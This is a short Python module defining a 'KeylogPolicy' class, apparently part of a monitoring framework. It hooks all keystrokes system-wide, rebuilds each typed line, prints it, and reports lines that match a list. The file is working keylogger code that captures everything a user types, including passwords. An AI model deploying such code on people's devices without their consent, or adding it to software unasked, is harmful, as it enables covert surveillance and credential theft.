from keyboard import on_press, wait

from lib.GlobalManager import gmget
from lib.Policy import Policy


class KeylogPolicy(Policy):
    line_typed = ""

    def __init__(self):
        super().__init__()
        self.name = "KeylogPolicy"
        self.active = False

    def callback(self, event):
        name = event.name

        if len(name) != 1:
            if name == "space":
                name = " "
            elif name == "decimal":
                name = "."
            elif name == "backspace":
                name = ""
                self.line_typed = self.line_typed[:-1]
            elif name == "enter":
                name = ""
                print(self.line_typed)

                if gmget("bwlist").check(self.line_typed):
                    gmget("reporter").report(self.line_typed)
                self.line_typed = ""
            else:
                name = ""

            self.line_typed += name
        else:
            self.line_typed += name

    def _THR_FUNC(self):
        # When key pressed
        while self.active:
            on_press(callback=self.callback)
            wait()